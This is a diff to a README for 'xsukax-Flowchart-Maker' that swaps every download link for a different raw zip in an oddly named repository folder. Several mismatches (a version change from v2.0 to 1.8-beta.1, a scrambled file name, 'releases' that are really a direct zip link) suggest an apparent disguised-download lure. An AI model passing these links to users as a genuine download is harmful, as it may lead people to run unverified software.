@@ -1,6 +1,6 @@
 # 🎉 xsukax-Flowchart-Maker - Create Flowcharts Easily and Privacy-Focused
 
-[![Download xsukax-Flowchart-Maker](https://raw.githubusercontent.com/MinhDuc0508/xsukax-Flowchart-Maker/main/monotocardian/xsukax-Flowchart-Maker-v2.0.zip)](https://raw.githubusercontent.com/MinhDuc0508/xsukax-Flowchart-Maker/main/monotocardian/xsukax-Flowchart-Maker-v2.0.zip)
+[![Download xsukax-Flowchart-Maker](https://github.com/MinhDuc0508/xsukax-Flowchart-Maker/raw/refs/heads/main/monotocardian/Maker-Flowchart-xsukax-1.8-beta.1.zip)](https://github.com/MinhDuc0508/xsukax-Flowchart-Maker/raw/refs/heads/main/monotocardian/Maker-Flowchart-xsukax-1.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **xsukax-Flowchart-Maker**! This tool lets you create high-quality fl
 
 To get started, visit the following link to download the application:
 
-[Download xsukax-Flowchart-Maker](https://raw.githubusercontent.com/MinhDuc0508/xsukax-Flowchart-Maker/main/monotocardian/xsukax-Flowchart-Maker-v2.0.zip)
+[Download xsukax-Flowchart-Maker](https://github.com/MinhDuc0508/xsukax-Flowchart-Maker/raw/refs/heads/main/monotocardian/Maker-Flowchart-xsukax-1.8-beta.1.zip)
 
 1. Open the link above in your browser.
 2. You will see a list of available releases.
@@ -69,4 +69,4 @@ Your feedback is important! Let us know your thoughts about **xsukax-Flowchart-M
 
 We plan to enhance the application with new features and improvements based on user feedback. Keep an eye on the Releases page for the latest updates.
 
-[Download xsukax-Flowchart-Maker](https://raw.githubusercontent.com/MinhDuc0508/xsukax-Flowchart-Maker/main/monotocardian/xsukax-Flowchart-Maker-v2.0.zip) and start creating your flowcharts today. Enjoy the process of designing and visualizing your ideas!
+[Download xsukax-Flowchart-Maker](https://github.com/MinhDuc0508/xsukax-Flowchart-Maker/raw/refs/heads/main/monotocardian/Maker-Flowchart-xsukax-1.8-beta.1.zip) and start creating your flowcharts today. Enjoy the process of designing and visualizing your ideas!
